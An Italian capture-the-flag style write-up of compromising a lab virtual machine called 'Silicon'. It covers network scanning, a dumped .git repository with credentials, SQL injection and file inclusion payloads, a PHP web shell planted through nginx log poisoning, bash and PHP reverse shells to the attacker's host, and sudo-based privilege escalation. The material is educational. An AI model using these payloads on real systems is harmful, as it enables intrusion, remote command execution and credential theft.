#+title: VDSI - Silicon
#+author: Andrea Pepe
#+date: 05/07/2022

* Foothold
** Subnet scanning
#+begin_example
$ sudo nmap -sP 192.168.56.0/24 -v
sudo: impossibile risolvere l'host roronoa: Errore temporaneo nella risoluzione del nome
Warning: The -sP option is deprecated. Please use -sn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-05 12:15 CEST
Initiating ARP Ping Scan at 12:15
Scanning 255 hosts [1 port/host]
Completed ARP Ping Scan at 12:15, 1.76s elapsed (255 total hosts)
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.0 [host down]
Nmap scan report for 192.168.56.1
Host is up (0.00026s latency).
MAC Address: 0A:00:27:00:00:03 (Unknown)
Nmap scan report for 192.168.56.2 [host down]
Nmap scan report for 192.168.56.3 [host down]
Nmap scan report for 192.168.56.4 [host down]
Nmap scan report for 192.168.56.5 [host down]
Nmap scan report for 192.168.56.6 [host down]
Nmap scan report for 192.168.56.7 [host down]
Nmap scan report for 192.168.56.8 [host down]
Nmap scan report for 192.168.56.9 [host down]
Nmap scan report for 192.168.56.10 [host down]
Nmap scan report for 192.168.56.11 [host down]
Nmap scan report for 192.168.56.12 [host down]
Nmap scan report for 192.168.56.13 [host down]
Nmap scan report for 192.168.56.14 [host down]
Nmap scan report for 192.168.56.15 [host down]
Nmap scan report for 192.168.56.16 [host down]
Nmap scan report for 192.168.56.17 [host down]
Nmap scan report for 192.168.56.18 [host down]
Nmap scan report for 192.168.56.19 [host down]
Nmap scan report for 192.168.56.20 [host down]
Nmap scan report for 192.168.56.21 [host down]
Nmap scan report for 192.168.56.22 [host down]
Nmap scan report for 192.168.56.23 [host down]
Nmap scan report for 192.168.56.24 [host down]
Nmap scan report for 192.168.56.25 [host down]
Nmap scan report for 192.168.56.26 [host down]
Nmap scan report for 192.168.56.27 [host down]
Nmap scan report for 192.168.56.28 [host down]
Nmap scan report for 192.168.56.29 [host down]
Nmap scan report for 192.168.56.30 [host down]
Nmap scan report for 192.168.56.31 [host down]
Nmap scan report for 192.168.56.32 [host down]
Nmap scan report for 192.168.56.33 [host down]
Nmap scan report for 192.168.56.34 [host down]
Nmap scan report for 192.168.56.35 [host down]
Nmap scan report for 192.168.56.36 [host down]
Nmap scan report for 192.168.56.37 [host down]
Nmap scan report for 192.168.56.38 [host down]
Nmap scan report for 192.168.56.39 [host down]
Nmap scan report for 192.168.56.40 [host down]
Nmap scan report for 192.168.56.41 [host down]
Nmap scan report for 192.168.56.42 [host down]
Nmap scan report for 192.168.56.43 [host down]
Nmap scan report for 192.168.56.44 [host down]
Nmap scan report for 192.168.56.45 [host down]
Nmap scan report for 192.168.56.46 [host down]
Nmap scan report for 192.168.56.47 [host down]
Nmap scan report for 192.168.56.48 [host down]
Nmap scan report for 192.168.56.49 [host down]
Nmap scan report for 192.168.56.50 [host down]
Nmap scan report for 192.168.56.51 [host down]
Nmap scan report for 192.168.56.52 [host down]
Nmap scan report for 192.168.56.53 [host down]
Nmap scan report for 192.168.56.54 [host down]
Nmap scan report for 192.168.56.55 [host down]
Nmap scan report for 192.168.56.56 [host down]
Nmap scan report for 192.168.56.57 [host down]
Nmap scan report for 192.168.56.58 [host down]
Nmap scan report for 192.168.56.59 [host down]
Nmap scan report for 192.168.56.60 [host down]
Nmap scan report for 192.168.56.61 [host down]
Nmap scan report for 192.168.56.62 [host down]
Nmap scan report for 192.168.56.63 [host down]
Nmap scan report for 192.168.56.64 [host down]
Nmap scan report for 192.168.56.65 [host down]
Nmap scan report for 192.168.56.66 [host down]
Nmap scan report for 192.168.56.67 [host down]
Nmap scan report for 192.168.56.68 [host down]
Nmap scan report for 192.168.56.69 [host down]
Nmap scan report for 192.168.56.70 [host down]
Nmap scan report for 192.168.56.71 [host down]
Nmap scan report for 192.168.56.72 [host down]
Nmap scan report for 192.168.56.73 [host down]
Nmap scan report for 192.168.56.74 [host down]
Nmap scan report for 192.168.56.75 [host down]
Nmap scan report for 192.168.56.76 [host down]
Nmap scan report for 192.168.56.77 [host down]
Nmap scan report for 192.168.56.78 [host down]
Nmap scan report for 192.168.56.79 [host down]
Nmap scan report for 192.168.56.80 [host down]
Nmap scan report for 192.168.56.81 [host down]
Nmap scan report for 192.168.56.82 [host down]
Nmap scan report for 192.168.56.83 [host down]
Nmap scan report for 192.168.56.84 [host down]
Nmap scan report for 192.168.56.85 [host down]
Nmap scan report for 192.168.56.86 [host down]
Nmap scan report for 192.168.56.87 [host down]
Nmap scan report for 192.168.56.88 [host down]
Nmap scan report for 192.168.56.89 [host down]
Nmap scan report for 192.168.56.90 [host down]
Nmap scan report for 192.168.56.91 [host down]
Nmap scan report for 192.168.56.92 [host down]
Nmap scan report for 192.168.56.93 [host down]
Nmap scan report for 192.168.56.94 [host down]
Nmap scan report for 192.168.56.95 [host down]
Nmap scan report for 192.168.56.96 [host down]
Nmap scan report for 192.168.56.97 [host down]
Nmap scan report for 192.168.56.98 [host down]
Nmap scan report for 192.168.56.99 [host down]
Nmap scan report for 192.168.56.100
Host is up (0.0016s latency).
MAC Address: 08:00:27:D8:52:83 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.102 [host down]
Nmap scan report for 192.168.56.103 [host down]
Nmap scan report for 192.168.56.104 [host down]
Nmap scan report for 192.168.56.105 [host down]
Nmap scan report for 192.168.56.106 [host down]
Nmap scan report for 192.168.56.107
Host is up (0.00066s latency).
MAC Address: 08:00:27:CF:37:E1 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.108 [host down]
Nmap scan report for 192.168.56.109 [host down]
Nmap scan report for 192.168.56.110 [host down]
Nmap scan report for 192.168.56.111 [host down]
Nmap scan report for 192.168.56.112 [host down]
Nmap scan report for 192.168.56.113 [host down]
Nmap scan report for 192.168.56.114 [host down]
Nmap scan report for 192.168.56.115 [host down]
Nmap scan report for 192.168.56.116 [host down]
Nmap scan report for 192.168.56.117 [host down]
Nmap scan report for 192.168.56.118 [host down]
Nmap scan report for 192.168.56.119 [host down]
Nmap scan report for 192.168.56.120 [host down]
Nmap scan report for 192.168.56.121 [host down]
Nmap scan report for 192.168.56.122 [host down]
Nmap scan report for 192.168.56.123 [host down]
Nmap scan report for 192.168.56.124 [host down]
Nmap scan report for 192.168.56.125 [host down]
Nmap scan report for 192.168.56.126 [host down]
Nmap scan report for 192.168.56.127 [host down]
Nmap scan report for 192.168.56.128 [host down]
Nmap scan report for 192.168.56.129 [host down]
Nmap scan report for 192.168.56.130 [host down]
Nmap scan report for 192.168.56.131 [host down]
Nmap scan report for 192.168.56.132 [host down]
Nmap scan report for 192.168.56.133 [host down]
Nmap scan report for 192.168.56.134 [host down]
Nmap scan report for 192.168.56.135 [host down]
Nmap scan report for 192.168.56.136 [host down]
Nmap scan report for 192.168.56.137 [host down]
Nmap scan report for 192.168.56.138 [host down]
Nmap scan report for 192.168.56.139 [host down]
Nmap scan report for 192.168.56.140 [host down]
Nmap scan report for 192.168.56.141 [host down]
Nmap scan report for 192.168.56.142 [host down]
Nmap scan report for 192.168.56.143 [host down]
Nmap scan report for 192.168.56.144 [host down]
Nmap scan report for 192.168.56.145 [host down]
Nmap scan report for 192.168.56.146 [host down]
Nmap scan report for 192.168.56.147 [host down]
Nmap scan report for 192.168.56.148 [host down]
Nmap scan report for 192.168.56.149 [host down]
Nmap scan report for 192.168.56.150 [host down]
Nmap scan report for 192.168.56.151 [host down]
Nmap scan report for 192.168.56.152 [host down]
Nmap scan report for 192.168.56.153 [host down]
Nmap scan report for 192.168.56.154 [host down]
Nmap scan report for 192.168.56.155 [host down]
Nmap scan report for 192.168.56.156 [host down]
Nmap scan report for 192.168.56.157 [host down]
Nmap scan report for 192.168.56.158 [host down]
Nmap scan report for 192.168.56.159 [host down]
Nmap scan report for 192.168.56.160 [host down]
Nmap scan report for 192.168.56.161 [host down]
Nmap scan report for 192.168.56.162 [host down]
Nmap scan report for 192.168.56.163 [host down]
Nmap scan report for 192.168.56.164 [host down]
Nmap scan report for 192.168.56.165 [host down]
Nmap scan report for 192.168.56.166 [host down]
Nmap scan report for 192.168.56.167 [host down]
Nmap scan report for 192.168.56.168 [host down]
Nmap scan report for 192.168.56.169 [host down]
Nmap scan report for 192.168.56.170 [host down]
Nmap scan report for 192.168.56.171 [host down]
Nmap scan report for 192.168.56.172 [host down]
Nmap scan report for 192.168.56.173 [host down]
Nmap scan report for 192.168.56.174 [host down]
Nmap scan report for 192.168.56.175 [host down]
Nmap scan report for 192.168.56.176 [host down]
Nmap scan report for 192.168.56.177 [host down]
Nmap scan report for 192.168.56.178 [host down]
Nmap scan report for 192.168.56.179 [host down]
Nmap scan report for 192.168.56.180 [host down]
Nmap scan report for 192.168.56.181 [host down]
Nmap scan report for 192.168.56.182 [host down]
Nmap scan report for 192.168.56.183 [host down]
Nmap scan report for 192.168.56.184 [host down]
Nmap scan report for 192.168.56.185 [host down]
Nmap scan report for 192.168.56.186 [host down]
Nmap scan report for 192.168.56.187 [host down]
Nmap scan report for 192.168.56.188 [host down]
Nmap scan report for 192.168.56.189 [host down]
Nmap scan report for 192.168.56.190 [host down]
Nmap scan report for 192.168.56.191 [host down]
Nmap scan report for 192.168.56.192 [host down]
Nmap scan report for 192.168.56.193 [host down]
Nmap scan report for 192.168.56.194 [host down]
Nmap scan report for 192.168.56.195 [host down]
Nmap scan report for 192.168.56.196 [host down]
Nmap scan report for 192.168.56.197 [host down]
Nmap scan report for 192.168.56.198 [host down]
Nmap scan report for 192.168.56.199 [host down]
Nmap scan report for 192.168.56.200 [host down]
Nmap scan report for 192.168.56.201 [host down]
Nmap scan report for 192.168.56.202 [host down]
Nmap scan report for 192.168.56.203 [host down]
Nmap scan report for 192.168.56.204 [host down]
Nmap scan report for 192.168.56.205 [host down]
Nmap scan report for 192.168.56.206 [host down]
Nmap scan report for 192.168.56.207 [host down]
Nmap scan report for 192.168.56.208 [host down]
Nmap scan report for 192.168.56.209 [host down]
Nmap scan report for 192.168.56.210 [host down]
Nmap scan report for 192.168.56.211 [host down]
Nmap scan report for 192.168.56.212 [host down]
Nmap scan report for 192.168.56.213 [host down]
Nmap scan report for 192.168.56.214 [host down]
Nmap scan report for 192.168.56.215 [host down]
Nmap scan report for 192.168.56.216 [host down]
Nmap scan report for 192.168.56.217 [host down]
Nmap scan report for 192.168.56.218 [host down]
Nmap scan report for 192.168.56.219 [host down]
Nmap scan report for 192.168.56.220 [host down]
Nmap scan report for 192.168.56.221 [host down]
Nmap scan report for 192.168.56.222 [host down]
Nmap scan report for 192.168.56.223 [host down]
Nmap scan report for 192.168.56.224 [host down]
Nmap scan report for 192.168.56.225 [host down]
Nmap scan report for 192.168.56.226 [host down]
Nmap scan report for 192.168.56.227 [host down]
Nmap scan report for 192.168.56.228 [host down]
Nmap scan report for 192.168.56.229 [host down]
Nmap scan report for 192.168.56.230 [host down]
Nmap scan report for 192.168.56.231 [host down]
Nmap scan report for 192.168.56.232 [host down]
Nmap scan report for 192.168.56.233 [host down]
Nmap scan report for 192.168.56.234 [host down]
Nmap scan report for 192.168.56.235 [host down]
Nmap scan report for 192.168.56.236 [host down]
Nmap scan report for 192.168.56.237 [host down]
Nmap scan report for 192.168.56.238 [host down]
Nmap scan report for 192.168.56.239 [host down]
Nmap scan report for 192.168.56.240 [host down]
Nmap scan report for 192.168.56.241 [host down]
Nmap scan report for 192.168.56.242 [host down]
Nmap scan report for 192.168.56.243 [host down]
Nmap scan report for 192.168.56.244 [host down]
Nmap scan report for 192.168.56.245 [host down]
Nmap scan report for 192.168.56.246 [host down]
Nmap scan report for 192.168.56.247 [host down]
Nmap scan report for 192.168.56.248 [host down]
Nmap scan report for 192.168.56.249 [host down]
Nmap scan report for 192.168.56.250 [host down]
Nmap scan report for 192.168.56.251 [host down]
Nmap scan report for 192.168.56.252 [host down]
Nmap scan report for 192.168.56.253 [host down]
Nmap scan report for 192.168.56.254 [host down]
Nmap scan report for 192.168.56.255 [host down]
Nmap scan report for 192.168.56.101
Host is up.
Read data files from: /usr/bin/../share/nmap
Nmap done: 256 IP addresses (4 hosts up) scanned in 1.83 seconds
           Raw packets sent: 511 (14.308KB) | Rcvd: 7 (196B)
#+end_example

L'ip address della macchina target è *192.168.56.107*.

** nmap
#+begin_example
$ sudo nmap -sS 192.168.56.107 -p-
sudo: impossibile risolvere l'host roronoa: Errore temporaneo nella risoluzione del nome
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-05 12:17 CEST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.107
Host is up (0.0013s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
MAC Address: 08:00:27:CF:37:E1 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.61 seconds
#+end_example

#+begin_example
$ nmap -sC -sV 192.168.56.107 -p22,80,443
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-05 12:18 CEST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.107
Host is up (0.00066s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f5:4a:c9:95:1e:80:1d:86:d9:40:d3:24:ad:31:ca:b4 (RSA)
|   256 41:68:00:42:a5:76:4f:ac:a0:53:3a:24:1c:61:92:cf (ECDSA)
|_  256 43:a9:0c:04:17:f6:aa:77:e0:78:19:af:2a:26:11:31 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=silicon.vdsi/organizationName=VDSI/stateOrProvinceName=Rome/countryName=IT
| Not valid before: 2021-07-05T08:41:09
|_Not valid after:  2022-07-05T08:41:09
| tls-nextprotoneg: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.18.0 (Ubuntu)
| tls-alpn: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.55 seconds
#+end_example

Dal certificato ssl, vediamo che il common name è *silicon.vdsi* e lo
salviamo nel file ~/etc/hosts~. Inoltre, a quanto pare la distribuzione
della macchina è Ubuntu e il servizio web è *nginx*.


** Web server (silicon.vdsi)
Sia da con HTTP che con HTTPS, accedendo a silicon.vdsi, sembra
esserci solo la pagina iniziale di nginx e nient'altro:
[[./img/nginx.png]]

*** Vhost enumeration
#+begin_example
$ gobuster vhost -u http://silicon.vdsi -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt 2>/dev/null
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://silicon.vdsi
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/07/05 12:23:22 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.silicon.vdsi (Status: 403) [Size: 162]
Found: backup.silicon.vdsi (Status: 403) [Size: 162]
===============================================================
2022/07/05 12:23:33 Finished
===============================================================
#+end_example

Ci sono due virtual hosts:
*dev.silicon.vdsi*
*backup.silicon.vdsi*
Li aggiungiamo al file ~/etc/hosts~ e vediamo cosa accade, anche se, da
gobuster, già vediamo che il codice di ritorno HTTP è 403.

*** File enumeration
#+begin_example
$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://silicon.vdsi -x php,js,html,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://silicon.vdsi
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,js,html,txt
[+] Timeout:                 10s
===============================================================
2022/07/05 12:29:55 Starting gobuster in directory enumeration mode
===============================================================
                                
===============================================================
2022/07/05 12:29:57 Finished
===============================================================
#+end_example

Non sembrano esserci files. Passiamo ad analizzare i vhosts.
** Web server (dev.silicon.vdsi)
*** File enumeration
#+begin_example
$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://dev.silicon.vdsi -x php,js,html,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.silicon.vdsi
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,js,html,txt
[+] Timeout:                 10s
===============================================================
2022/07/05 12:31:39 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 162]
/.hta.js              (Status: 403) [Size: 162]
/.hta.html            (Status: 403) [Size: 162]
/.hta.txt             (Status: 403) [Size: 162]
/.htaccess.js         (Status: 403) [Size: 162]
/.htpasswd.txt        (Status: 403) [Size: 162]
/.htaccess.html       (Status: 403) [Size: 162]
/.htpasswd            (Status: 403) [Size: 162]
/.htaccess.txt        (Status: 403) [Size: 162]
/.htpasswd.js         (Status: 403) [Size: 162]
/.htaccess            (Status: 403) [Size: 162]
/.htpasswd.html       (Status: 403) [Size: 162]
/admin                (Status: 301) [Size: 178] [--> http://dev.silicon.vdsi/admin/]
/cgi-bin/.html        (Status: 403) [Size: 162]                                     
Progress: 6790 / 23075 (29.43%)                                               Progress: 13270 / 23075 (57.51%)                                              Progress: 19885 / 23075 (86.18%)                                                                                                                                  
===============================================================
2022/07/05 12:31:40 Finished
===============================================================
#+end_example

Ci sono vari files, a cui non abbiamo accesso (HTTP code
403). Inoltre, c'è una cartella */admin*. Se proviamo ad accedere alla
risorsa da browser, ci viene chiesto username e password per il login.

[[./img/login.png]]



** Web server (backup.silicon.vdsi)
*** File enumeration
#+begin_example
$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://backup.silicon.vdsi -x php,js,html,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://backup.silicon.vdsi
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,js,html,txt
[+] Timeout:                 10s
===============================================================
2022/07/05 12:32:22 Starting gobuster in directory enumeration mode
===============================================================
/.hta.txt             (Status: 403) [Size: 162]
/.git/HEAD            (Status: 200) [Size: 23] 
/.hta                 (Status: 403) [Size: 162]
/.hta.php             (Status: 403) [Size: 162]
/.hta.js              (Status: 403) [Size: 162]
/.hta.html            (Status: 403) [Size: 162]
/.htaccess            (Status: 403) [Size: 162]
/.htpasswd            (Status: 403) [Size: 162]
/.htaccess.php        (Status: 403) [Size: 162]
/.htpasswd.php        (Status: 403) [Size: 162]
/.htaccess.js         (Status: 403) [Size: 162]
/.htpasswd.js         (Status: 403) [Size: 162]
/.htaccess.html       (Status: 403) [Size: 162]
/.htpasswd.html       (Status: 403) [Size: 162]
/.htaccess.txt        (Status: 403) [Size: 162]
/.htpasswd.txt        (Status: 403) [Size: 162]
/cgi-bin/.html        (Status: 403) [Size: 162]
                                               
===============================================================
2022/07/05 12:32:24 Finished
===============================================================
#+end_example

Stavolta, la cartella admin non è esposta, bensì è esposta la risorsa
*/.git/HEAD*. Possiamo provare a fare il dump del repository git, usando
il comando ~git-dumper~.

*** Git dump
#+begin_example
$ git-dumper http://backup.silicon.vdsi/.git/HEAD repo

$ ls -la repo
totale 20
drwxr-xr-x 4 andrea andrea 4096  5 lug 12.39 .
drwxr-xr-x 4 andrea andrea 4096  5 lug 12.39 ..
drwxr-xr-x 2 andrea andrea 4096  5 lug 12.39 admin
drwxr-xr-x 7 andrea andrea 4096  5 lug 12.39 .git
-rw-r--r-- 1 andrea andrea   22  5 lug 12.39 .htpasswd
#+end_example

Nel file *.htpasswd* ci sono le seguenti credenziali:
*gilfoyle:Pipers_Guard*

Usandole per accedere alla risorsa /admin sul vhost dev.silicon.vdsi,
si ottiene l'accesso e si viene ridirezionati alla pagina *index.php*,
in cui appare un altro form di login:
[[./img/login2.png]]

E' iniettabile con SQL injection
#+begin_example
' or 1=1 #
#+end_example
come username permette di loggarsi e si viene loggati come utente
*richard.*
Tuttavia, ci sono solo pagine che apparentemente non hanno nulla di
interessante.Però, quando loggati, ci viene detto 'Hi, richard', che è
lo username con cui siamo loggati.
Probabilmente può essere usato con altre SQL injections per ottenere
informazioni. Guardiamo il codice php per capire com'è fatta la query:
#+begin_src php
$username = $_POST['username'];
	$password = $_POST['password'];
	$hashed = hash('sha256', trim($password));
        $sql = "SELECT id, username, password FROM pied_piper.users WHERE password = '$hashed' AND username = '$username'";
#+end_src

Proviamo ad esempio iniettando nel campo username quanto segue:
#+begin_example
' union select all 500, @@version, 'ciao' #
#+end_example

[[./img/mariadb.png]]

Analogamente, si ottengono le seguenti informazioni:
*Versione*: MariaDB-10.3.29
*Database*:pied_piper
*Datadir*: /var/lib/mysql
*User*: richard@localhost


Inoltre, sfrutteremo questa sql injection in seguito per ottenere
ulteriori informazioni.

*** git log
Esaminando il log di git si è visto che la password di accesso alla
risorsa web /admin è stata cambiata nel tempo:

Abbiamo le seguenti password, di cui una delle due sembra una hash,
entrambe associate allo user *gilfoyle*:

*$apr1$W3Cs0Glu$hZx.AHh9kr5TAFFy9NzqJ0*
*PiedPiperls -la*

*** LFI (Local File Inclusion)
Una volta loggati, dalla pagina *index.php*, se si va in home o in
about, si nota che nello url appare un campo id con associato un
numero pari ad 1 o a 2.
Analizziamo il codice che abbiamo della pagina index.php e capiamo se
tale campo è soggetto a LFI.
#+begin_src html
<?php
//ini_set('display_errors', 1);
//ini_set('display_startup_errors', 1);
//error_reporting(E_ALL);

// Initialize the session
session_start();

// Check if the user is logged in, if not then redirect him to login page
if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
    header("location: login.php");
    exit;
}


require_once "db.php";
 
 
if($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET['id'])){
	$query = "select path from paths where name in (select name from ids where id = '" . $_GET['id'] . "')";
	$res = mysqli_query($link, $query);

	if (!$res) {
		$error = 'Something went wrong';	
	} else {
		$value = mysqli_fetch_array($res);
		if (!isset($value['path'])) {
			$error = 'Something went wrong';
		} else {
			$result = $value['path'];
		}
	}

    // Close connection
    mysqli_close($link);
}

?>
 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Pied Piper Developer's area</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.css">
    <style type="text/css">
        body{ font: 14px sans-serif; text-align: center; }
    </style>
</head>
<body>
<nav class="navbar navbar-default navbar-fixed-top">
  <div class="container">
    <ul class="nav navbar-nav">
        <li><a href="index.php">Home</a></li>
	<li><a href="index.php?id=1">Main</a></li>
	<li><a href="index.php?id=2">About</a></li>
	<li><a href="logout.php">Logout</a></li>
      </ul>
  </div>
</nav>
<br /> <br />
	<div class="page-header">
        <h1>Hi, <b><?php echo htmlspecialchars($_SESSION["username"]); ?></b>.</h1>
    </div>
    <div class="container jumbotron">
	<form method="POST">
	<div class="form-group">
	
	<?php if(isset($error)) : ?>
	<div class="container">
	<?php echo $error; ?>
	</div>
	<?php endif; ?>
	
	<?php if(isset($result)) : ?>
	<div class="container">
	<?php include($result); ?>
	</div>
	<?php else: ?>
	<h2>Home</h2>
	<?php endif; ?>
	
	</div>
    </div>
</body>
</html>
#+end_src

Viene fatto:
#+begin_src 
<?php include($result); ?>
#+end_src

Tale result è costruito con una query SQL. In particolare, è dato
dal valore della prima riga della seguente query (la colonna è unica):
#+begin_example
$query = "select path from paths where name in (select name from ids where id = '" . $_GET['id'] . "')";
#+end_example

Proviamo a farne una injection nel seguente modo: con un apice singolo
la select più interna non dovrebbe ritornare alcun risultato
(assumiamo che non ci siano id vuoti) e, di conseguenza, anche la
query più esterna ha un risultato vuoto.
Se riusciamo a chiudere le due query e a farne la union con una select
di un una stringa (path) che vogliamo includere, dovremmo vedere il
path. Proviamo iniettando nel campo id quanto segue:
#+begin_example
') union select all ('/etc/passwd
#+end_example

Notare che usiamo parentesi e apice aperto, così, senza dover
aggiungere commenti, possiamo sfruttare i caratter ') di chiusura
della query.

L'injection ha successo.

[[./img/etcpasswd.png]]


A questo punto possiamo fare *log poisoning* effettuando una richiesta
HTTP errata contenente:
#+begin_example
<?php system($_GET['cmd']); ?>
#+end_example
al suo interno, così da farla apparire nell'access log del server
nginx.
Dopodiché, facendo caricare il file ~/var/log/nginx/access.log~, il
codice php verrà eseguito e specificando un comando nella GET HTTP col
parametro 'cmd' potremo eseguire un comando sulla macchina target. Lo
useremo per ottenere una reverse shell (in bash).

Sulla macchina attaccante (192.168.56.101), ci mettiamo in ascolto di
connessioni:
#+begin_example
nc -lvnp 4444
#+end_example

La reverse shell è
#+begin_example
bash -c 'bash -i >& /dev/tcp/192.168.56.101/4444 0>&1'
#+end_example

In realtà, questa reverse shell sembra non funzionare. Nemmeno con
python funziona. Proviamo a farla in php visto che siamo sicuri che è
presente sulla macchina.
#+begin_example
php -r '$sock=fsockopen("192.168.56.101",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
#+end_example

[[./img/rev_shell_burp.png]]

In questo modo, otteniamo una shell:
[[./img/revshell.png]]

* Privilege escalation
** www-data
Vediamo chi sono gli altri utenti:
#+begin_example
www-data@silicon:~/dev$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false
richard:x:1001:1001:Richard,,,:/home/richard:/bin/bash
gilfoyle:x:1002:1002:gilfoyle,,,:/home/gilfoyle:/bin/bash
#+end_example


Dopo aver fatto l'upgrade della shell, facciamo il cat del file *db.php*
che avevamo dal repository git ma in cui la password non
c'era. Vediamo invece che qui c'è!
[[./img/richard_pass.png]]

Credenziali:
*richard:R1ch4rd_p455w0rd_yy*

Andando indietro invece, nella cartella ~/dev, nel file .htpasswd, ci
sono le credenziali di gilfoyle, con l'hash trovata in precedenza.

Eseguendo il comando:
#+begin_example
su richard
#+end_example

con la password ~R1ch4rd_p455w0rd_yy~, si riesce a diventare l'utente
*richard*!

** richard
Avendo la password dell'utente, la prima cosa che viene provata è
vedere se abbiamo i permessi per eseguire qualche programma/comando
come un altro utente, con *sudo -l*:
#+begin_example
richard@silicon:~$ sudo -l
[sudo] password for richard: 
Matching Defaults entries for richard on silicon:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User richard may run the following commands on silicon:
    (gilfoyle) /usr/bin/less *
#+end_example

Vediamo che possiamo eseguire il comando *less* come utente *gilfoyle* e
quindi potenzialmente leggere i file a cui tale utente ha accesso in lettura.

